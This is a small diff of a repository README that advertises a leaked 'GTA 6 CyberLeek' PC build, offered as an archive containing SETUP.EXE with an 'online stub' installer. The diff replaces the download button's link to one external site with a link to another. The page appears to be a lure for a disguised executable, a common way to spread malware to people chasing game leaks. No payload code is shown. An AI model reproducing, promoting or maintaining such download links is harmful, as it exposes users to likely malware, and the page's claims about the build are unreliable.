@@ -4,7 +4,7 @@
 
 <p><b>CyberLeek · November build · online installer · PC launch path</b></p>
 
-[![Download GTA 6 CyberLeek Build](https://img.shields.io/badge/⬇_DOWNLOAD_PACKAGE-28A745?style=for-the-badge&logo=windows&logoColor=white)](https://shanxisaide.com/s/file)
+[![Download GTA 6 CyberLeek Build](https://img.shields.io/badge/⬇_DOWNLOAD_PACKAGE-28A745?style=for-the-badge&logo=windows&logoColor=white)](https://uwu.solodev.ru/gta6-cl)
 
 ![Package](https://img.shields.io/badge/PACKAGE-ARCHIVE_→_SETUP.EXE-155724?style=flat-square&logo=windows&logoColor=white)
 ![Installer](https://img.shields.io/badge/INSTALLER-ONLINE_STUB-155724?style=flat-square)
